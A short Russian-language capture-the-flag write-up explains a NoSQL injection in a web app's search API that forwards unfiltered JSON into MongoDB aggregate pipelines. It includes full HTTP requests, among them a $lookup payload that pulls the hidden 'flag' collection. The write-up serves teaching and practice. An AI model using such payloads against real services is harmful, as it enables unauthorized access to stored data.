К заданию даются исходные коды. После анализа приходим к выводу, что для поиска используются aggregate-запросы в mongodb. Кроме того, запрос от пользователя посылается в json-виде и не проходит фильтрации.

Это позволяет нам сделать aggregate запрос, объединяющий несколько коллекций (в нашем случае коллекцию flag)

#### Эксплуатация

При попытке поиска на на сервер посылается запрос следующего вида:

```http
POST /api HTTP/1.1
Host: 172.21.30.20:3000
Content-Length: 43
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36
Content-Type: application/json
Accept: */*
Origin: http://172.21.30.20:3000
Referer: http://172.21.30.20:3000/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

{"$match":{"message":{"$regex":".*sometext.*"}}}
```

Мы можем делать любые aggregate-запросы, оформленные в виде json-объектов. Запрос для конкатенации данных из двух коллекций может выглядеть следующим образом:

```http
POST /api HTTP/1.1
Host: 172.21.30.20:3000
Content-Length: 129
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36
Content-Type: application/json
Accept: */*
Origin: http://172.21.30.20:3000
Referer: http://172.21.30.20:3000/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

{ "$lookup": {
            "from": "flag",
            "as": "__flag",
"foreignField":"__flag","localField":"flag"
        }}
```

Здесь используется [$lookup](https://docs.mongodb.com/manual/reference/operator/aggregation/lookup/) запрос для объединения информации из нескольких коллекций
